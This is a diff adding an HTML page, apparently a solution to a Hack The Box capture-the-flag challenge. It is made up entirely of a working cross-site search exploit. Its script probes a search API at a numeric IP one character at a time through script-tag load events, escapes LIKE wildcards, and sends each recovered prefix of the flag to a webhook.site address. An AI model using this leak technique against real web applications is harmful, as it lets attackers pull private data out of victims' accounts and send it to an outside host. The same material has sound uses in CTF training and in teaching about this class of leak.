@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Ehe</title>
+    </head>
+    <body>
+        <script>
+            const brute_force_flag = (flag) => {
+                for (let i = 32; i < 127; i++) {
+                    let curChar = String.fromCharCode(i);
+                    if ('_%'.includes(curChar)) {
+                        curChar = '\\' + curChar;
+                    }
+                    
+                    let elem = document.createElement('script');
+                    let curFlag = flag + curChar;
+                    elem.src = `http://167.172.61.89:31622/api/entries/search?q=${encodeURIComponent(curFlag)}`;
+                    elem.onload = () => {
+                        fetch(`https://webhook.site/ce587c88-e8e2-4397-9cb7-df2c22c5f8bb/${curFlag.replace('\\', '')}`);
+                        brute_force_flag(curFlag);
+                    };
+                    document.head.appendChild(elem);
+                }
+            };
+            brute_force_flag('HTB{')
+        </script>
+    </body>
+</html>
